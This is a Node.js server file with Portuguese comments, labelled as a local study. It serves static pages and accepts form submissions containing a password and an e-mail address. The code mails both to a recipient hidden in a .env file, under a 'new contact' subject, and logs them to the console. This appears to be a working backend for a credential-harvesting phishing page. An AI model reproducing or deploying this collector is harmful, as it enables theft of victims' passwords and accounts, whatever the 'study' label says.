// Backend de ESTUDO LOCAL.
// Serve o HTML estático e envia os dados do formulário (senha + e-mail) por e-mail.
require("dotenv").config();

const http = require("http");
const fs = require("fs");
const path = require("path");
const nodemailer = require("nodemailer");

const PORT = process.env.PORT || 3000;
const DIR = __dirname;

const TYPES = { ".html": "text/html; charset=utf-8", ".png": "image/png" };

// Configura o transporte SMTP a partir do .env
const transporter = nodemailer.createTransport({
  host: process.env.SMTP_HOST,
  port: Number(process.env.SMTP_PORT) || 587,
  secure: String(process.env.SMTP_SECURE) === "true", // true = porta 465
  auth: {
    user: process.env.SMTP_USER,
    pass: process.env.SMTP_PASS,
  },
});

function lerCorpo(req) {
  return new Promise((resolve, reject) => {
    let body = "";
    req.on("data", (chunk) => {
      body += chunk;
      if (body.length > 1e6) req.destroy(); // ~1MB, evita corpo gigante
    });
    req.on("end", () => resolve(body));
    req.on("error", reject);
  });
}

function json(res, status, obj) {
  res.writeHead(status, { "Content-Type": "application/json; charset=utf-8" });
  res.end(JSON.stringify(obj));
}

const server = http.createServer(async (req, res) => {
  if (req.method === "POST" && req.url === "/enviar") {
    try {
      const body = await lerCorpo(req);
      let dados;
      try {
        dados = JSON.parse(body);
      } catch {
        return json(res, 400, { ok: false, erro: "JSON inválido" });
      }

      const senha = String(dados.senha || "").trim();
      const email = String(dados.email || "").trim();

      if (!senha || !email) {
        return json(res, 400, { ok: false, erro: "senha e e-mail são obrigatórios." });
      }
      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
        return json(res, 400, { ok: false, erro: "E-mail inválido." });
      }

      await transporter.sendMail({
        from: process.env.MAIL_FROM || process.env.SMTP_USER,
        to: process.env.MAIL_TO, // destino definido no .env
        replyTo: email,
        subject: `Novo contato: ${senha}`,
        text: `senha: ${senha}\nE-mail: ${email}\nData: ${new Date().toLocaleString("pt-BR")}`,
      });

      console.log(`Enviado: ${senha} <${email}>`);
      return json(res, 200, { ok: true });
    } catch (err) {
      console.error("Falha ao enviar e-mail:", err.message);
      return json(res, 500, { ok: false, erro: "Falha ao enviar o e-mail." });
    }
  }

  // Arquivos estáticos (html / png)
  const senha = req.url === "/" ? "/index.html" : req.url;
  const arquivo = path.join(DIR, path.normalize(senha).replace(/^(\.\.[/\\])+/, ""));
  fs.readFile(arquivo, (err, conteudo) => {
    if (err) {
      res.writeHead(404).end("Não encontrado");
      return;
    }
    const ext = path.extname(arquivo).toLowerCase();
    res.writeHead(200, { "Content-Type": TYPES[ext] || "application/octet-stream" });
    res.end(conteudo);
  });
});

server.listen(PORT, () => {
  console.log(`Servidor rodando em http://localhost:${PORT}`);
});
